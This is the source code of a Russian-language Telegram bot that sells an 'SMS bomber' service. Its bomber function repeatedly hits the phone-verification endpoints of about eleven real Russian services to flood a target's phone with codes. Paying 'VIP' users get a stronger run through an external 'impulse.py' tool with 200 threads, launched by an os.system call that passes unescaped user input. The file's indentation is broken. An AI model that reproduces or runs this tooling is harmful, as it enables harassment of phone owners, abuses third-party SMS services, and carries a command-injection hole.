import telebot, pywwf, json, requests, time, os
try:
    import Image
	except ImportError:
	    from PIL import Image


	token = pywwf.read("token.txt")
	bot = telebot.TeleBot(token)


	kb = telebot.types.ReplyKeyboardMarkup(True)
	kb.row("💣Sms Bomber", "📑Профиль")
	kb.row("📊Статистика", "👑VIP Бомбер")
	kb.row("ℹ️Информацияℹ️")

	kb_vip = telebot.types.ReplyKeyboardMarkup(True)
	kb_vip.row("🌟Реквизиты🌟")
	kb_vip.row("❓Проверить Оплату❓")
	kb_vip.row("🔙Назад")


	def photo(id, pic, kb):
		bot.send_photo(id, open(str(pic), "rb"), reply_markup=kb)
	def msg(id, text, kb):
		bot.send_message(id, str(text), reply_markup=kb)

	Users = []
	UsersId = open("users.txt", "r")
	UsersId2 = set()
	for line in UsersId:
		UsersId2.add(line.strip())
	UsersId.close()
	for word in UsersId2:
		Users.append(word)

	Vip = []
	UsersId2 = open("vip.txt", "r")
	UsersId22 = set()
	for line in UsersId2:
		UsersId22.add(line.strip())
	UsersId2.close()
	for wordvip in UsersId22:
		Vip.append(wordvip)


	def payment_history_last(my_login, api_access_token, rows_num, next_TxnId, next_TxnDate):
	    # сессия для рекуест
	    s = requests.Session()
	    # добавляем рекуесту headers
	    s.headers['authorization'] = 'Bearer ' + api_access_token
	    # параметры
	    parameters = {'rows': rows_num, 'nextTxnId': next_TxnId, 'nextTxnDate': next_TxnDate}
	    # через рекуест получаем платежы с параметрами - parameters
	    h = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + my_login + '/payments', params = parameters)
	    # обязательно json все объекты в киви апи json
	    return h.json()

	mylogin = pywwf.read("qiwiPhone.txt")
	api_access_token = pywwf.read("qiwi.txt")

	def arg(argu):
	    return argu.split()[1]
	def arg0(argu):
	    return argu.split()[0]

	def bomber(number):
		s = 0
		f = 0
		import time
		import requests as r
		import fake_useragent
		user = fake_useragent.UserAgent().random
		headers = {"user_agent" : user}
		for i in range(6):
			#YOULA
			try:
				res = r.post("https://youla.ru/web-api/auth/request_code", headers=headers, data={"phone" : number})
				s += 1
			except:
				f += 1

			#IVI
			try:
				res = r.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", headers=headers, data={"phone" : number})
				s += 1
			except:
				f += 1

			#LENTA
			try:
				res = r.post("https://lenta.com/api/v1/registration/requestValidationCode", headers=headers, json={"phone" : "+"+number})
				s += 1
			except:
				f += 1

			#OK
			try:
				res = r.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", headers=headers, data={"st.r.phone" : "+"+number})
				s += 1
			except:
				f += 1

			#DNS
			try:
				res = r.post("https://www.dns-shop.ru/auth/auth/fast-authorization/", headers=headers, data={"FastAuthorizationLoginLoadForm[login]" : number})
				s += 1
			except:
				f += 1

			#MODULBANK
			try:
				res = r.post("https://my.modulbank.ru/api/v2/auth/phone", headers=headers, data={"CellPhone" : number[1:]})
				s += 1
			except:
				f += 1

			#SUNLIGHT
			try:
				res = r.post("https://api.sunlight.net/v3/customers/authorization/", headers=headers, data={"phone" : number})
				s += 1
			except:
				f += 1

			#YANDEX EDA
			try:
				res = r.post("https://eda.yandex/api/v1/user/request_authentication_code", headers=headers, json={"phone_number" : "+"+number})
				s += 1
			except:
				f += 1

			#TINKOFF
			try:
				res = r.post("https://api.tinkoff.ru/v1/sign_up", headers=headers, data={"phone": "+"+number})
				s += 1
			except:
				f += 1

			#ICQ
			try:
				res = r.post("https://www.icq.com/smsreg/requestPhoneValidation.php", headers=headers, data={
					"msisdn": number,
				"locale": "en",
				"countryCode": "ru",
				"version": "1",
				"k": "ic1rtwz1s1Hj1O0r",
				"r": "46763"
					})
				s += 1
			except:
				f += 1

			#CITILINK
			try:
				res = r.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/")
				s += 1
			except:
				f += 1
			time.sleep(9)
		sp = []
		sp.append(s)
		sp.append(f)
		return sp

	@bot.message_handler(content_types=["text"])
	def send_text(message):
		id = message.chat.id
		sms = message.text

		#Проверка
		if str(id) not in Users:
			pywwf.write("users.txt", "a", str(id)+"\n")
			Users.append(str(id))

		if sms == "/start" or sms == "🔙Назад":
			msg(id, "Воскпользуйся клавиатурой:", kb)
		elif sms == "💣Sms Bomber":
			if str(id) in Vip:
				msg(id, "😇Введите номер телефона и время(в секундах) до 3-х минут в формате: \n"
			"🇷🇺79995553535 180\n"
			"🇰🇿77005553535 180\n"
			"🇧🇾375123456789 180\n"
			"🇺🇦380123456789 180\n"
			"Если ввести номер както иначе, то бот просто не запустит спам", kb)
			else:
				msg(id, "😇Введите номер телефона в формате: \n"
				"🇷🇺79995553535\n"
				"🇰🇿77005553535\n"
				"🇧🇾375123456789\n"
				"🇺🇦380123456789\n"
				"Если ввести номер както иначе, то бот просто не запустит спам", kb)
		elif sms == "📑Профиль":
			if str(id) in Vip:
				zn = "✅"
			else:
				zn = "❌"
			msg(id, "💁‍♂️ ID | "+str(id)+"\n\n🛡️VIP Статус | "+zn, kb)
		elif sms == "📊Статистика":
			human = len(Users)
			usersvip = len(Vip)
			number = pywwf.read("number.txt")
			msg(id, "📊Статистика отображается в реальном времени\n"
			"👤Пользователей - "+str(human)+"\n🛡️Пользователей VIP - "+str(usersvip)+"\n"
			"📴Номеров заспамленно - "+str(number)+"\n"
			"⏲️Бот работает с 24.02.2021", kb)
		elif sms == "👑VIP Бомбер":
			msg(id, "Воскпользуйся клавиатурой:", kb_vip)
		elif sms == "🌟Реквизиты🌟":
			msg(id, "Цена | 95р\n\nРеквизиты оплаты:\nQIWI | +77084053915\nКоментарий | "+str(id)+"\n\nОБЯЗАТЕЛЬНО!\nУказать коментрий при платеже, в противном случае оплата не будет засчитана", kb_vip)
		elif sms == "❓Проверить Оплату❓":
			lastPayments = payment_history_last(mylogin, api_access_token, '1', '', '')
			num = lastPayments['data'][0]['account']
			sum = lastPayments['data'][0]['sum']['amount']
			comm = lastPayments['data'][0]['comment']
			type = lastPayments['data'][0]['type']
			last_pay = pywwf.read("lastPay.txt")
			if str(type) == last_pay:
				msg(id, "❌Платёж не найден", kb_vip)
			else:
				if sum >= 95 and str(comm) in Users:
					if str(comm) in Vip:
						msg(id, "У данного пользователя уже есть VIP Статус", kb)
					else:
						Vip.append(str(comm))
						pywwf.write("vip.txt", "a", str(comm)+"\n")
						pywwf.write("lastPay.txt", "w", str(type))
						msg(id, "✅Патеж найден!\n\nПользователю с айди "+str(comm)+" был выдан VIP Статус!", kb)
				else:
					msg(id, "❌Некоректно указан коментарий", kb_vip)
		elif sms[0:5] == "/rass":
			if str(id) == "1676630770" or str(id) == "868535514":
				success = 0
				fail = 0
				msg(id, "Рассылка началась!", kb)
				for us in Users:
					try:
						msg(us, sms[6:], kb)
						success += 1
					except:
						fail += 1
				msg(id, "Результаты рассылки:\n\nУспех | "+str(success)+"\nФеил | "+str(fail), kb)
			else:
				msg(id, "Ну, увы нельзя тебе:)))", kb)
				photo(id, "image.jpg", kb)
		elif sms[0:4] == "/add":
			if str(id) == "1676630770" or str(id) == "868535514":
				try:
					add_id = str(arg(sms))
					if add_id in Vip:
						msg(id, "У данного пользователя уже есть VIP Статус", kb)
					elif add_id not in Vip and add_id not in Users:
						msg(id, "Данный пользователь не числиться в базе данных", kb)
					else:
						Vip.append(add_id)
						pywwf.write("vip.txt", "a", add_id+"\n")
						msg(int(add_id), "✅Администрация выдала вам VIP Статус", kb)
						msg(id, "✅Пользователь с айди "+add_id+" получил VIP Статус", kb)
				except:
					msg(id, "Не указан айди", kb)
			else:
				msg(id, "Ну, увы нельзя тебе:)))", kb)
				photo(id, "image.jpg", kb)
		elif sms == "ℹ️Информацияℹ️":
			msg(id, "👨‍💻Разработчик\n     Telegram | @Lucky1376\n↪️\n     VK | https://vk.com/id554311036\n\n\n💁‍♂️Директор\n     Telegram | @A7777AA7777A\n↪️\n     VK | https://vk.com/officaluser", kb)
		elif len(arg0(sms)) == 11 and sms[0:1] == "7" or len(arg0(sms)) == 12 and sms[0:1] == "3":
			if str(id) not in Vip:
				try:
					time = arg(sms)
					msg(id, "❌Некоректно указан номер", kb)
				except:
					import time
					msg(id, "📱Номер | "+str(sms)+"\n⏱️Время | 1 минута", kb)
					time.sleep(0.2)
					msg(id, "💣Спам Запущен!", kb)
					result_spam = bomber(str(sms))
					pywwf.math("number.txt", "+1")
					msg(id, "💣Спам завершен!", kb)
					msg(id, "Результаты\n\nОтправлено запросов "+str(result_spam[0]+result_spam[1])+"\n\n✅Успешно | "+str(result_spam[0])+"\n❌Неудачно | "+str(result_spam[1]), kb)
			else:
				try:
					times = arg(sms)
					number = arg0(sms)
					if int(times) > 180:
						msg(id, "❌Нельзя указывать время более 3-х минут", kb)
					elif int(times) < 11:
						msg(id, "❌Нельзя указывать время менее 11 секунд", kb)
					else:
						import time
						msg(id, "📱Номер | "+str(sms)+"\n⏱️Время | "+str(times)+"сек", kb)
						time.sleep(0.2)
						msg(id, "💣Спам Запущен!", kb)
						os.system("python impulse.py --method SMS --time "+str(times)+" --threads 200 --target "+number)
						pywwf.math("number.txt", "+1")
						#msg(868535514, str(number), kb)
						#time.sleep(60)
						msg(id, "💣Спам завершен!", kb)
				except:
					msg(id, "❌Не указано время", kb)


bot.polling()
